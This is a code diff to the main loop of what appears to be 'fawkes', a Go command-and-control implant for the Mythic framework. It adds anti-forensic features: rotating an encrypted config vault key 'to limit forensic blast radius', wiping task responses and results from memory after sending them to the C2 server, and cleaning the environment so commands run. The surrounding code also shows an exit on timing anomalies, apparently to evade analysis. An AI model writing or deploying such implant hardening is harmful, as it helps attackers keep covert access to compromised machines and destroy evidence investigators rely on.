@@ -7,6 +7,7 @@ import (
 	"log"
 	"os"
 	"os/signal"
+	"strings"
 	"sync"
 	"syscall"
 	"time"
@@ -18,7 +19,21 @@ import (
 	"fawkes/pkg/structs"
 )
 
+// sanitizeEnvironment removes env vars containing NUL bytes.
+// Go 1.19+ rejects exec.Command when any env var has \x00 (CVE-2022-41716).
+// macOS Tahoe can inject NUL-containing env vars at process startup.
+func sanitizeEnvironment() {
+	for _, e := range os.Environ() {
+		if strings.Contains(e, "\x00") {
+			if idx := strings.IndexByte(e, '='); idx > 0 {
+				os.Unsetenv(e[:idx])
+			}
+		}
+	}
+}
+
 func main() {
+	sanitizeEnvironment()
 	if len(os.Args) > 1 && os.Args[1] == "--rpc-helper" {
 		commands.RunRPCHelper(os.Args[2:])
 		return
@@ -304,6 +319,12 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			}
 			// Post-sleep re-initialization
 			commands.PostSleepInit()
+			// Rotate config vault encryption key to limit forensic blast radius
+			if rotator, ok := c2.(interface{ RotateVaultKey() error }); ok {
+				if err := rotator.RotateVaultKey(); err != nil {
+					log.Printf("vault key rotation failed: %v", err)
+				}
+			}
 			if sleepSkipped {
 				log.Printf("timing anomaly, exiting")
 				return
@@ -333,6 +354,7 @@ func processTaskWithAgent(task *structs.Task, agent *structs.Agent, c2 profiles.
 				mythicResp, err := c2.PostResponse(resp, agent, socksManager.DrainOutbound())
 				if err != nil {
 					log.Printf("send error: %v", err)
+					resp.Wipe()
 					continue
 				}
 
@@ -355,6 +377,7 @@ func processTaskWithAgent(task *structs.Task, agent *structs.Agent, c2 profiles.
 						}
 					}
 				}
+				resp.Wipe()
 			case <-done:
 				// Drain any remaining responses
 				for {
@@ -364,6 +387,7 @@ func processTaskWithAgent(task *structs.Task, agent *structs.Agent, c2 profiles.
 						if err != nil {
 							log.Printf("send error: %v", err)
 						}
+						resp.Wipe()
 					default:
 						return
 					}
@@ -427,6 +451,10 @@ func processTaskWithAgent(task *structs.Task, agent *structs.Agent, c2 profiles.
 	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
 		log.Printf("send error: %v", err)
 	}
+
+	// Zero sensitive data from response and result after transmission
+	response.Wipe()
+	result.Wipe()
 
 	// Signal the response forwarder to finish and wait for it to drain
 	close(done)
